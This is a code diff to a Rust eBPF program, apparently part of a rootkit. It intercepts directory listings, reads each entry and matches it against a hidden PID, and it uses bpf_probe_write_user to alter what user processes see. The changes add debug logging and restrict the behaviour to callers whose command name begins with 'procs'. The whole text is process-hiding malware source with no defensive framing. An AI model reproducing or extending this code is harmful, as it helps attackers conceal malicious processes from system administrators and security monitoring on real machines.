@@ -4,7 +4,10 @@
 use aya_ebpf::{
     bindings::{bpf_attr, bpf_cmd},
     cty::c_void,
-    helpers::{bpf_get_current_pid_tgid, bpf_loop, bpf_probe_read, bpf_probe_write_user},
+    helpers::{
+        bpf_get_current_comm, bpf_get_current_pid_tgid, bpf_loop, bpf_probe_read,
+        bpf_probe_write_user,
+    },
     macros::{map, tracepoint},
     maps::HashMap,
     programs::TracePointContext,
@@ -155,15 +158,26 @@ struct DirentData<'a> {
 #[inline]
 fn patch_dirent_if_found(idx: u32, ctx: &mut DirentData) -> i64 {
     if idx >= MAX_DIRENTS {
+        info!((*ctx).ctx, "{}>{}", idx, MAX_DIRENTS);
         return 1;
     }
+
     if let Ok(dirent) = unsafe {
         bpf_probe_read((ctx.dirents_buf_addr + ctx.bpos) as *const LinuxDirent64).map_err(|_| 1u32)
     } {
+        if let Ok(cmd) = bpf_get_current_comm().map_err(|_| 1u32) {
+            if cmd[..5] == [112, 114, 111, 99, 115] {
+                info!((*ctx).ctx, "{} @ {}", idx, ctx.bpos);
+            } else {
+                return 1;
+            }
+        }
+
         ctx.bpos += dirent.d_reclen as u64;
+
         let hidden_pid_bytes = unsafe { core::ptr::read_volatile(&HIDDEN_PID) }.to_be_bytes();
 
-        let dname_slice = unsafe { dirent.d_name.as_slice(4) };
+        let dname_slice = unsafe { dirent.d_name.as_slice(10) };
 
         for (a, b) in dname_slice.into_iter().zip(hidden_pid_bytes) {
             if *a as u8 != b {
@@ -173,13 +187,15 @@ fn patch_dirent_if_found(idx: u32, ctx: &mut DirentData) -> i64 {
             info!((*ctx).ctx, "{}: FOUND IT!", caller_pid);
         }
     } else {
-        error!((*ctx).ctx, "iter {} not found:(", idx);
+        info!((*ctx).ctx, "iter {} not found:(", idx);
         return 1;
     }
+
     if ctx.bpos >= ctx.max_offset {
-        debug!((*ctx).ctx, "maxoffset exceeded");
+        info!((*ctx).ctx, "maxoffset {} exceeded", ctx.max_offset);
         return 1;
     }
+
     0
 }
 //    if(is_end_of_buff(data->bpos, data->buff_size)) return 1;
